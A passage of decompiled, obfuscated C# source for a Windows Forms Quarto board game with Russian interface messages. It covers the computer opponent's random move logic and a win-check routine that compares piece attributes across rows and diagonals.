					if (!(Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue))
					{
						num3 = -335384543;
						num8 = -335384543;
					}
					else
					{
						num3 = -1808962265;
						num8 = -1808962265;
					}
					continue;
				}
				case 22u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -1887738862;
						num12 = -1887738862;
					}
					else
					{
						num11 = -1882684205;
						num12 = -1882684205;
					}
					num3 = num11 ^ (int)(num4 * 446234027);
					continue;
				}
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num3 = (int)(num4 * 1476745027) ^ -648018822;
					continue;
				case 20u:
					num5++;
					num3 = (int)(num4 * 881643537) ^ -1484871124;
					continue;
				case 19u:
				{
					int num13;
					if (num6 < 4)
					{
						num3 = -1071964892;
						num13 = -1071964892;
					}
					else
					{
						num3 = -1662231885;
						num13 = -1662231885;
					}
					continue;
				}
				case 18u:
					num7 = ((board[num2, num] == null) ? 1 : 0);
					goto IL_0104;
				case 17u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = 1117535288;
						num10 = 1117535288;
					}
					else
					{
						num9 = 490829250;
						num10 = 490829250;
					}
					num3 = num9 ^ ((int)num4 * -519936099);
					continue;
				}
				case 16u:
					num3 = ((int)num4 * -576682476) ^ 0x5E766F3D;
					continue;
				case 15u:
					flag = num5 < 4;
					num3 = -402809828;
					continue;
				case 14u:
					num3 = (int)((num4 * 1705801426) ^ 0x71979F19);
					continue;
				case 12u:
					num5 = 0;
					num3 = ((int)num4 * -399430866) ^ 0x1030F385;
					continue;
				case 11u:
					num3 = (int)(num4 * 580576674) ^ -914874690;
					continue;
				case 10u:
					num6++;
					num3 = -68654540;
					continue;
				case 9u:
					num6 = 0;
					num3 = -225216303;
					continue;
				case 8u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num3 = ((int)num4 * -1057566997) ^ -1716763927;
					continue;
				case 7u:
					Paint_Board();
					num3 = (int)((num4 * 1015066054) ^ 0x544EE5E);
					continue;
				case 5u:
					Form1.smethod_45(graphics_);
					num3 = (int)((num4 * 499487095) ^ 0x57B4BD1);
					continue;
				case 4u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num2 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num3 = ((int)num4 * -1188196288) ^ 0x736186E;
					continue;
				case 3u:
					num3 = (int)(num4 * 165171992) ^ -655306394;
					continue;
				case 2u:
					num3 = (int)((num4 * 453137526) ^ 0x40A786E4);
					continue;
				case 1u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num3 = (int)(num4 * 817404062) ^ -1277457203;
						continue;
					}
					num7 = 0;
					goto IL_0104;
				case 0u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num * size + 4, num2 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num3 = (int)((num4 * 1871600710) ^ 0x454360D6);
					continue;
				default:
					return;
				case 13u:
					break;
				case 6u:
					return;
					IL_0104:
					flag2 = (byte)num7 != 0;
					num3 = -1728851032;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Expected O, but got Unknown
		int num53 = default(int);
		bool flag12 = default(bool);
		int num7 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag = default(bool);
		int num33 = default(int);
		int num17 = default(int);
		int num34 = default(int);
		int num29 = default(int);
		int num44 = default(int);
		int num21 = default(int);
		int num22 = default(int);
		bool flag13 = default(bool);
		bool flag2 = default(bool);
		int num9 = default(int);
		int num14 = default(int);
		int num16 = default(int);
		bool flag11 = default(bool);
		bool flag8 = default(bool);
		int num28 = default(int);
		int num40 = default(int);
		int num41 = default(int);
		Figurine[,] array = default(Figurine[,]);
		int num27 = default(int);
		int num10 = default(int);
		int num13 = default(int);
		bool flag4 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag9 = default(bool);
		bool flag7 = default(bool);
		bool flag3 = default(bool);
		bool flag5 = default(bool);
		bool flag10 = default(bool);
		int num30 = default(int);
		bool flag6 = default(bool);
		while (true)
		{
			int num = -594532082;
			while (true)
			{
				uint num2;
				int num48;
				int num32;
				int num37;
				int num20;
				switch ((num2 = (uint)num ^ 0xD0D1C7BBu) % 166u)
				{
				case 165u:
					num = ((int)num2 * -896042615) ^ -446987356;
					continue;
				case 164u:
				{
					int num58;
					if (num53 < 4)
					{
						num = -205069061;
						num58 = -205069061;
					}
					else
					{
						num = -1708148822;
						num58 = -1708148822;
					}
					continue;
				}
				case 163u:
					num53++;
					num = (int)((num2 * 1160795756) ^ 0x2AC5E2CD);
					continue;
				case 162u:
				{
					int num46;
					int num47;
					if (!flag12)
					{
						num46 = 1233933368;
						num47 = 1233933368;
					}
					else
					{
						num46 = 1779891033;
						num47 = 1779891033;
					}
					num = num46 ^ ((int)num2 * -968669545);
					continue;
				}
				case 161u:
					num7 = 0;
					num = ((int)num2 * -176401604) ^ 0x52D9F18D;
					continue;
				case 160u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -2046052795;
					continue;
				case 159u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = ((int)num2 * -1392181476) ^ -1785980442;
					continue;
				case 158u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					num = ((int)num2 * -1462533059) ^ 0x53F6084D;
					continue;
				case 157u:
					storage[num5, num6] = null;
					flag = Standoff(board);
					num = ((int)num2 * -40917504) ^ -1619484770;
					continue;
				case 156u:
					Form1.smethod_7((Control)(object)pictureBox[num7, num33], bool_0: false);
					num = ((int)num2 * -390469957) ^ -706523988;
					continue;
				case 155u:
					storage[num17, num34] = null;
					Paint_Board();
					num = (int)((num2 * 91042611) ^ 0x529D5703);
					continue;
				case 154u:
					num34 = 0;
					num = (int)(num2 * 2061128180) ^ -1966434783;
					continue;
				case 153u:
					num = ((int)num2 * -360408103) ^ -1581066100;
					continue;
				case 152u:
					array3[num29, num44] = new Figurine(storage[num21, num22]);
					flag13 = Stop(array3);
					num = ((int)num2 * -1394844171) ^ 0xD5AE2AB;
					continue;
				case 151u:
					flag2 = num9 < 4;
					num = -1326194244;
					continue;
				case 150u:
					num = -560764130;
					continue;
				case 149u:
					flag12 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num14 * size + size / 2, (int)(((float)num16 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -459406517;
					continue;
				case 148u:
				{
					int num54;
					int num55;
					if (!flag11)
					{
						num54 = 1845351633;
						num55 = 1845351633;
					}
					else
					{
						num54 = 2003346117;
						num55 = 2003346117;
					}
					num = num54 ^ (int)(num2 * 595141106);
					continue;
				}
				case 147u:
					num = (int)(num2 * 861720865) ^ -1071225815;
					continue;
				case 146u:
					num44 = 0;
					num = -1188181771;
					continue;
				case 145u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = (int)(num2 * 1336142822) ^ -1478424511;
					continue;
				case 144u:
					num = -1304413369;
					continue;
				case 143u:
					if (!flag8)
					{
						num = ((int)num2 * -712705285) ^ 0x529150CD;
						continue;
					}
					goto IL_02e4;
				case 142u:
					num28++;
					flag8 = false;
					num = -1093883437;
					continue;
				case 141u:
					num14 = 0;
					num = -1696359639;
					continue;
				case 140u:
					num = ((int)num2 * -1308180412) ^ -1165655268;
					continue;
				case 139u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -2129020184) ^ 0xB2484BA;
					continue;
				case 138u:
					board[num40, num41] = new Figurine(storage[num5, num6]);
					storage[num5, num6] = null;
					Form1.smethod_5((Control)(object)borderBox[num21, num22], Color.Blue);
					num = ((int)num2 * -1677584245) ^ 0x3E47F7CB;
					continue;
				case 137u:
					num = ((int)num2 * -1586664761) ^ 0x7679E62C;
					continue;
				case 136u:
					Form1.smethod_30((Control)(object)pictureBox[num16, num14]);
					num = (int)((num2 * 736479262) ^ 0x1C2DFCE2);
					continue;
				case 135u:
					num = -1188436418;
					continue;
				case 134u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -752738622) ^ -92173435;
					continue;
				case 133u:
					step++;
					num = (int)((num2 * 1779943038) ^ 0x6B753D2B);
					continue;
				case 132u:
					if (!Stop(array))
					{
						num = ((int)num2 * -1374977803) ^ -2083847318;
						continue;
					}
					goto IL_045c;
				case 131u:
					num27 = 0;
					num16 = 0;
					num = ((int)num2 * -1658804997) ^ 0x254F438C;
					continue;
				case 130u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 719206363) ^ 0x607D4BA9);
					continue;
				case 129u:
					num = ((int)num2 * -1791070263) ^ -945662294;
					continue;
				case 128u:
					num = ((int)num2 * -1960819629) ^ 0x11BCB9A9;
					continue;
				case 127u:
					num = ((int)num2 * -143271957) ^ 0xC58E6D5;
					continue;
				case 126u:
					if (storage[num21, num22] != null)
					{
						num = (int)((num2 * 1058901781) ^ 0x67A3A0A7);
						continue;
					}
					goto IL_0514;
				case 125u:
					num = (int)((num2 * 416131636) ^ 0x775B0DD8);
					continue;
				case 124u:
					num17 = num16;
					num = (int)(num2 * 782255630) ^ -899892544;
					continue;
				case 123u:
					num = -1383616317;
					continue;
				case 122u:
					num = (int)((num2 * 1157735786) ^ 0x200F03F9);
					continue;
				case 121u:
					num = (int)(num2 * 1352584480) ^ -1187147925;
					continue;
				case 120u:
					array[num9, num10] = new Figurine(storage[num5, num6]);
					num = (int)(num2 * 218493465) ^ -1863089801;
					continue;
				case 119u:
					num = ((int)num2 * -1995219448) ^ 0x3A6D301;
					continue;
				case 117u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 1938343688) ^ -1017696182;
					continue;
				case 116u:
					num = (int)((num2 * 1147338715) ^ 0x37C561D0);
					continue;
				case 115u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = (int)((num2 * 712892274) ^ 0xD169280);
					continue;
				case 114u:
					num21 = Form1.smethod_33(rnd, 4);
					num = -1432318407;
					continue;
				case 113u:
					Form1.smethod_7((Control)(object)pictureBox[num53, num13], bool_0: true);
					num = -1046553820;
					continue;
				case 111u:
					num = (int)((num2 * 1047190208) ^ 0x3B2C54ED);
					continue;
				case 110u:
					if (num21 == num5)
					{
						num = (int)((num2 * 138174459) ^ 0x24889D0C);
						continue;
					}
					goto IL_0520;
				case 109u:
					num33++;
					num = ((int)num2 * -1739631135) ^ 0x563289D2;
					continue;
				case 108u:
				{
					int num61;
					int num62;
					if (flag4)
					{
						num61 = 1286352749;
						num62 = 1286352749;
					}
					else
					{
						num61 = 1064967169;
						num62 = 1064967169;
					}
					num = num61 ^ (int)(num2 * 1724891541);
					continue;
				}
				case 107u:
					num6 = num33;
					num = (int)(num2 * 1272585243) ^ -664059371;
					continue;
				case 106u:
				{
					int num60;
					if (Standoff(board))
					{
						num = -1314936695;
						num60 = -1314936695;
					}
					else
					{
						num = -627540164;
						num60 = -627540164;
					}
					continue;
				}
				case 105u:
					num = ((int)num2 * -876926846) ^ 0x1A966180;
					continue;
				case 104u:
					num = ((int)num2 * -38870819) ^ -1863014199;
					continue;
				case 103u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 259826047) ^ -1766709370;
					continue;
				case 102u:
					num = -1273465862;
					continue;
				case 101u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -981802838) ^ 0x70F1F9B0;
					continue;
				case 100u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num10 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num10 * size + 4, num9 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1668421490) ^ -1509187074;
					continue;
				case 99u:
					num6 = 0;
					num = (int)(num2 * 475948041) ^ -156214175;
					continue;
				case 98u:
					flag9 = num33 < 4;
					num = -1034351756;
					continue;
				case 97u:
					num13++;
					num = ((int)num2 * -1372961936) ^ -798528381;
					continue;
				case 96u:
					num = ((int)num2 * -1912581444) ^ -21358324;
					continue;
				case 95u:
					flag7 = Form1.smethod_41((Control)(object)borderBox[num7, num33]) == Color.Red;
					num = ((int)num2 * -378586727) ^ -2029214798;
					continue;
				case 94u:
					num = (int)((num2 * 421290404) ^ 0x78866134);
					continue;
				case 93u:
					Form1.smethod_20(pictureBox[num16, num14], (Image)null);
					num = ((int)num2 * -1687243030) ^ -1172976977;
					continue;
				case 92u:
					num53 = 0;
					num = ((int)num2 * -615221996) ^ -1816406125;
					continue;
				case 91u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -881197946) ^ 0x4B6C742D;
					continue;
				case 90u:
				{
					int num59;
					if (num16 < 4)
					{
						num = -481335010;
						num59 = -481335010;
					}
					else
					{
						num = -230338426;
						num59 = -230338426;
					}
					continue;
				}
				case 89u:
					num33 = 0;
					num = -377468387;
					continue;
				case 88u:
					num44++;
					num = -1188181771;
					continue;
				case 87u:
					if (num28 >= 9)
					{
						num = -782406160;
						num48 = -782406160;
						continue;
					}
					goto IL_02e4;
				case 86u:
					num = ((int)num2 * -1336441608) ^ 0x165F0332;
					continue;
				case 85u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num41 + 0.05f) * (float)size, ((float)num40 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1236085712) ^ 0x414D1854;
					continue;
				case 84u:
					num17 = 0;
					num = ((int)num2 * -533138754) ^ -714704807;
					continue;
				case 83u:
					num = (int)(num2 * 471937800) ^ -1755180660;
					continue;
				case 82u:
					num27 = num14;
					num = (int)((num2 * 22458032) ^ 0x6A57D268);
					continue;
				case 81u:
				{
					int num56;
					int num57;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num56 = 343156913;
						num57 = 343156913;
					}
					else
					{
						num56 = 162068234;
						num57 = 162068234;
					}
					num = num56 ^ (int)(num2 * 832147954);
					continue;
				}
				case 80u:
				{
					int num51;
					int num52;
					if (flag3)
					{
						num51 = -1875149542;
						num52 = -1875149542;
					}
					else
					{
						num51 = -392388380;
						num52 = -392388380;
					}
					num = num51 ^ ((int)num2 * -1467899193);
					continue;
				}
				case 79u:
					step++;
					num = (int)((num2 * 954875116) ^ 0x707226A8);
					continue;
				case 78u:
					num13 = 0;
					num = -998452187;
					continue;
				case 77u:
					Form1.smethod_5((Control)(object)borderBox[num16, num14], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num16, num14]);
					num = ((int)num2 * -1208387262) ^ -427362766;
					continue;
				case 76u:
					Form1.smethod_47(200);
					num = (int)(num2 * 14437071) ^ -1220907150;
					continue;
				case 75u:
					Form1.smethod_30((Control)(object)borderBox[num21, num22]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 2025114273) ^ 0x5D33B2BD);
					continue;
				case 74u:
					flag5 = num44 < 4;
					num = -375031624;
					continue;
				case 73u:
					num40 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1036813186) ^ 0x19EF15B2);
					continue;
				case 72u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -562906141) ^ -753084825;
					continue;
				case 71u:
					Form1.smethod_15(timer1);
					num = -2139177479;
					continue;
				case 70u:
					num = ((int)num2 * -1882081753) ^ -1366067497;
					continue;
				case 69u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 137194121) ^ -1115341219;
					continue;
				case 68u:
					num10++;
					num = -336329808;
					continue;
				case 67u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 378075386) ^ -227156170;
					continue;
				case 66u:
					flag10 = Form1.smethod_41((Control)(object)borderBox[num16, num14]) == Color.Blue;
					num = -1019489813;
					continue;
				case 65u:
					if (!Standoff(array))
					{
						num = -1713473984;
						num32 = -1713473984;
						continue;
					}
					goto IL_045c;
				case 64u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 868130001) ^ 0x16DBF183);
					continue;
				case 63u:
					num7++;
					num = (int)((num2 * 841583852) ^ 0x537AB965);
					continue;
				case 62u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = ((int)num2 * -118861763) ^ -762698091;
					continue;
				case 61u:
					num16++;
					num = (int)(num2 * 116486364) ^ -829099515;
					continue;
				case 60u:
				{
					int num49;
					int num50;
					if (!flag13)
					{
						num49 = 233188071;
						num50 = 233188071;
					}
					else
					{
						num49 = 1645920253;
						num50 = 1645920253;
					}
					num = num49 ^ ((int)num2 * -615577836);
					continue;
				}
				case 59u:
					num14++;
					num = (int)(num2 * 663447849) ^ -1500677212;
					continue;
				case 58u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 250036372) ^ 0x325CEA40);
					continue;
				case 57u:
				{
					int num45;
					if (num29 < 4)
					{
						num = -695029189;
						num45 = -695029189;
					}
					else
					{
						num = -30130790;
						num45 = -30130790;
					}
					continue;
				}
				case 56u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -674274852) ^ -1190967091;
					continue;
				case 55u:
					if (num22 == num6)
					{
						goto IL_0514;
					}
					goto IL_0520;
				case 54u:
					flag11 = array2[num29, num44] == null;
					num = -2066377761;
					continue;
				case 53u:
				{
					num41 = Form1.smethod_33(rnd, 4);
					int num42;
					int num43;
					if (board[num40, num41] == null)
					{
						num42 = -688648967;
						num43 = -688648967;
					}
					else
					{
						num42 = -1278173993;
						num43 = -1278173993;
					}
					num = num42 ^ ((int)num2 * -1744128628);
					continue;
				}
				case 52u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -1553033992) ^ -784376806;
					continue;
				case 51u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num41 * size + 4, num40 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 293062081) ^ 0x7059D125);
					continue;
				case 50u:
					num22 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 271528366) ^ 0x18862F3C);
					continue;
				case 49u:
					num = ((int)num2 * -1143734487) ^ -1603049304;
					continue;
				case 48u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -996334971) ^ -1723571435;
					continue;
				case 47u:
					num = -235058357;
					continue;
				case 46u:
					num = -1550992502;
					continue;
				case 45u:
					num = (int)((num2 * 1087336969) ^ 0x47FD0115);
					continue;
				case 44u:
					num10 = 0;
					num = -336329808;
					continue;
				case 43u:
					if (!Stop(board))
					{
						num = (int)((num2 * 1338783168) ^ 0x5AA825AA);
						continue;
					}
					num37 = 0;
					goto IL_0f57;
				case 42u:
					array2[num40, num41] = new Figurine(storage[num5, num6]);
					num = (int)(num2 * 306580563) ^ -560892280;
					continue;
				case 41u:
					num34 = num14;
					num = (int)(num2 * 1479878153) ^ -1667268845;
					continue;
				case 40u:
				{
					int num38;
					int num39;
					if (flag10)
					{
						num38 = -514839031;
						num39 = -514839031;
					}
					else
					{
						num38 = -1904403196;
						num39 = -1904403196;
					}
					num = num38 ^ (int)(num2 * 2134916085);
					continue;
				}
				case 39u:
					num29++;
					num = (int)(num2 * 1861234541) ^ -609116873;
					continue;
				case 38u:
					num30 = num16;
					num = (int)(num2 * 250999600) ^ -776766673;
					continue;
				case 37u:
					num37 = ((!Standoff(board)) ? 1 : 0);
					goto IL_0f57;
				case 36u:
					num = (int)(num2 * 273536598) ^ -296059283;
					continue;
				case 35u:
					num9++;
					num = (int)(num2 * 1488048961) ^ -216907281;
					continue;
				case 34u:
					num = (int)((num2 * 2053076349) ^ 0x6EC069E1);
					continue;
				case 33u:
					num = (int)((num2 * 1844979856) ^ 0x1BD70274);
					continue;
				case 32u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = (int)(num2 * 347945546) ^ -362098360;
					continue;
				case 31u:
				{
					int num35;
					int num36;
					if (flag9)
					{
						num35 = -1917161817;
						num36 = -1917161817;
					}
					else
					{
						num35 = -2001259740;
						num36 = -2001259740;
					}
					num = num35 ^ (int)(num2 * 183215748);
					continue;
				}
				case 30u:
					flag8 = true;
					num = ((int)num2 * -1757500775) ^ -1578063055;
					continue;
				case 29u:
					board[num30, num27] = new Figurine(storage[num17, num34]);
					num = (int)((num2 * 876915995) ^ 0x174C1F31);
					continue;
				case 28u:
					Form1.smethod_5((Control)(object)borderBox[num7, num33], Color.LimeGreen);
					Form1.smethod_30((Control)(object)borderBox[num7, num33]);
					num5 = num7;
					num = ((int)num2 * -20820072) ^ 0x6A3CC13A;
					continue;
				case 27u:
				{
					int num31;
					if (num10 >= 4)
					{
						num = -1021292016;
						num31 = -1021292016;
					}
					else
					{
						num = -1315742962;
						num31 = -1315742962;
					}
					continue;
				}
				case 26u:
					num30 = 0;
					num = ((int)num2 * -1950396421) ^ 0x28946236;
					continue;
				case 25u:
					num = ((int)num2 * -1056036768) ^ 0x26A3AC94;
					continue;
				case 24u:
					num = ((int)num2 * -244801592) ^ -2017379485;
					continue;
				case 23u:
					num29 = 0;
					num = ((int)num2 * -875444684) ^ 0x11DC8393;
					continue;
				case 22u:
					num = ((int)num2 * -1041404659) ^ 0x57C4D0B9;
					continue;
				case 21u:
					num = ((int)num2 * -470490533) ^ -616277891;
					continue;
				case 20u:
					num = ((int)num2 * -508236522) ^ -1349471148;
					continue;
				case 19u:
					num28 = 0;
					num = ((int)num2 * -1866251632) ^ 0xF6CD109;
					continue;
				case 18u:
				{
					int num25;
					int num26;
					if (!flag7)
					{
						num25 = -203428317;
						num26 = -203428317;
					}
					else
					{
						num25 = -1552764063;
						num26 = -1552764063;
					}
					num = num25 ^ ((int)num2 * -1516967781);
					continue;
				}
				case 17u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num9 = 0;
					num = ((int)num2 * -1571070656) ^ 0x36784A8C;
					continue;
				case 16u:
				{
					int num23;
					int num24;
					if (!flag6)
					{
						num23 = -1312228445;
						num24 = -1312228445;
					}
					else
					{
						num23 = -87694998;
						num24 = -87694998;
					}
					num = num23 ^ ((int)num2 * -325031616);
					continue;
				}
				case 15u:
				{
					int num18;
					int num19;
					if (!flag5)
					{
						num18 = 1876780236;
						num19 = 1876780236;
					}
					else
					{
						num18 = 1985635863;
						num19 = 1985635863;
					}
					num = num18 ^ ((int)num2 * -975426528);
					continue;
				}
				case 14u:
				{
					int num15;
					if (num14 < 4)
					{
						num = -916923021;
						num15 = -916923021;
					}
					else
					{
						num = -1617921798;
						num15 = -1617921798;
					}
					continue;
				}
				case 13u:
					flag4 = board[num9, num10] == null;
					num = -2017752447;
					continue;
				case 12u:
					flag3 = num13 < 4;
					num = -1107051087;
					continue;
				case 11u:
					board[num9, num10] = new Figurine(storage[num5, num6]);
					num = (int)(num2 * 637787234) ^ -390790648;
					continue;
				case 10u:
					num = ((int)num2 * -386963164) ^ -2125703327;
					continue;
				case 9u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = (int)(num2 * 443534981) ^ -700188972;
					continue;
				case 8u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -226756890) ^ -229061375;
					continue;
				case 7u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = -2020128706;
						num12 = -2020128706;
					}
					else
					{
						num11 = -1461385471;
						num12 = -1461385471;
					}
					num = num11 ^ ((int)num2 * -1171584777);
					continue;
				}
				case 6u:
					num = -406749607;
					continue;
				case 5u:
					num = ((int)num2 * -72069660) ^ -2144526032;
					continue;
				case 4u:
					num = -740160211;
					continue;
				case 3u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num5 = 0;
					num = ((int)num2 * -775077488) ^ 0x1F50B62C;
					continue;
				case 2u:
				{
					int num8;
					if (num7 >= 4)
					{
						num = -316113700;
						num8 = -316113700;
					}
					else
					{
						num = -1549177210;
						num8 = -1549177210;
					}
					continue;
				}
				case 1u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1097015510;
						num4 = -1097015510;
					}
					else
					{
						num3 = -1668570100;
						num4 = -1668570100;
					}
					num = num3 ^ (int)(num2 * 675433559);
					continue;
				}
				case 0u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 880814290) ^ -135358711;
					continue;
				default:
					return;
				case 118u:
					break;
				case 112u:
					return;
					IL_0514:
					num = -605537795;
					num20 = -605537795;
					continue;
					IL_045c:
					num = -1630003177;
					num32 = -1630003177;
					continue;
					IL_0f57:
					flag6 = (byte)num37 != 0;
					num = -813198877;
					continue;
					IL_02e4:
					num = -1274303943;
					num48 = -1274303943;
					continue;
					IL_0520:
					num = -61218689;
					num20 = -61218689;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool result = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag4 = default(bool);
		while (true)
		{
			int num = 394409291;
			while (true)
			{
				uint num2;
				int num15;
				int num20;
				switch ((num2 = (uint)num ^ 0x488A9017u) % 79u)
				{
				case 78u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)((num2 * 889427735) ^ 0x7214A943);
						continue;
					}
					goto IL_0035;
				case 77u:
				{
					int num65;
					int num66;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num65 = -549502602;
						num66 = -549502602;
					}
					else
					{
						num65 = -165670208;
						num66 = -165670208;
					}
					num = num65 ^ ((int)num2 * -1871398735);
					continue;
				}
				case 76u:
				{
					int num16;
					int num17;
					if (mem[0, 0] == null)
					{
						num16 = -191155549;
						num17 = -191155549;
					}
					else
					{
						num16 = -342884362;
						num17 = -342884362;
					}
					num = num16 ^ ((int)num2 * -250611898);
					continue;
				}
				case 75u:
					result = flag2;
					num = 1317643813;
					continue;
				case 74u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 1190204352) ^ -942141811;
						continue;
					}
					goto IL_00ed;
				case 73u:
				{
					int num40;
					int num41;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num40 = -347150122;
						num41 = -347150122;
					}
					else
					{
						num40 = -1200569279;
						num41 = -1200569279;
					}
					num = num40 ^ (int)(num2 * 798405411);
					continue;
				}
				case 72u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 1953173910) ^ -652782437;
						continue;
					}
					goto IL_016a;
				case 71u:
				{
					int num70;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = 1677127013;
						num70 = 1677127013;
					}
					else
					{
						num = 403674686;
						num70 = 403674686;
					}
					continue;
				}
				case 70u:
				{
					int num55;
					int num56;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num55 = 173859425;
						num56 = 173859425;
					}
					else
					{
						num55 = 1792886900;
						num56 = 1792886900;
					}
					num = num55 ^ ((int)num2 * -1389201275);
					continue;
				}
				case 69u:
					if (mem[0, num3] != null)
					{
						num = 685973182;
						continue;
					}
					goto IL_01fa;
				case 68u:
				{
					int num30;
					int num31;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num30 = 1199694087;
						num31 = 1199694087;
					}
					else
					{
						num30 = 1537404921;
						num31 = 1537404921;
					}
					num = num30 ^ ((int)num2 * -240108649);
					continue;
				}
				case 67u:
				{
					int num10;
					int num11;
					if (mem[num3, 2] != null)
					{
						num10 = 760914747;
						num11 = 760914747;
					}
					else
					{
						num10 = 1157862270;
						num11 = 1157862270;
					}
					num = num10 ^ (int)(num2 * 825208428);
					continue;
				}
				case 66u:
				{
					int num73;
					if (mem[0, num3].Dark == mem[1, num3].Dark)
					{
						num = 1679048393;
						num73 = 1679048393;
					}
					else
					{
						num = 1092919563;
						num73 = 1092919563;
					}
					continue;
				}
				case 65u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1160992047) ^ -423201396;
						continue;
					}
					goto IL_016a;
				case 64u:
				{
					int num59;
					int num60;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num59 = -1065992798;
						num60 = -1065992798;
					}
					else
					{
						num59 = -468738569;
						num60 = -468738569;
					}
					num = num59 ^ ((int)num2 * -931437903);
					continue;
				}
				case 63u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -354112863) ^ 0x6D29929B;
						continue;
					}
					goto IL_034a;
				case 62u:
				{
					int num51;
					int num52;
					if (mem[num3, 1].Dark != mem[num3, 2].Dark)
					{
						num51 = 999444754;
						num52 = 999444754;
					}
					else
					{
						num51 = 115146276;
